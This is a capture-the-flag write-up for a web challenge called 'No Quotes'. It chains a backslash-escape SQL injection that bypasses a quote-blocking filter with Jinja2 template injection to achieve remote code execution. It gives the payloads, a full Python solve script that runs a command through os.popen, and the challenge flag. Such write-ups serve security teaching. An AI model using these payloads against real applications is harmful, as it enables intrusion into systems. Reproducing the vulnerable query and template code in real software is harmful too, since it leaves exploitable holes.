# Web - No

---
Category: Web
Challenge Name: No Quotes

## TL;DR
SQLi (backslash escape) → SSTI → RCE

## Vulnerabilities

### 1. SQL Injection
The login query is vulnerable:
```python
query = f"WHERE username = ('{username}') AND password = ('{password}')"
```

WAF blocks `'` and `"`, but **not backslashes**. Using `\` as username escapes the closing quote:
```sql
WHERE username = ('\') AND password = ('...
                   ↑ escaped!
```
This lets us inject SQL in the password field.

### 2. SSTI
The home page unsafely renders the username:
```python
render_template_string(template % session["user"])
```
If username contains `{{ code }}`, Jinja2 executes it.

## Exploit

**Payload:**
- **Username:** `\`
- **Password:** `) UNION SELECT 1, 0x<hex_encoded_ssti> #`

The SSTI payload (hex-encoded to avoid quotes):
```
{{ config.__class__.__init__.__globals__['os'].popen('/readflag').read() }}
```

## Solve Script
```python
import requests, binascii

url = "https://no-quotes.chals.uoftctf.org/"
ssti = "{{ config.__class__.__init__.__globals__['os'].popen('/readflag').read() }}"

s = requests.Session()
s.post(f"{url}/login", data={
    "username": "\\",
    "password": f") UNION SELECT 1, 0x{binascii.hexlify(ssti.encode()).decode()} #"
})
print(s.get(f"{url}/home").text)
```

**Flag:** `uoftctf{y0u_FU1Ly_Esc4p3d_7h3_57R1nG!}`
---

Solved by: jerit3787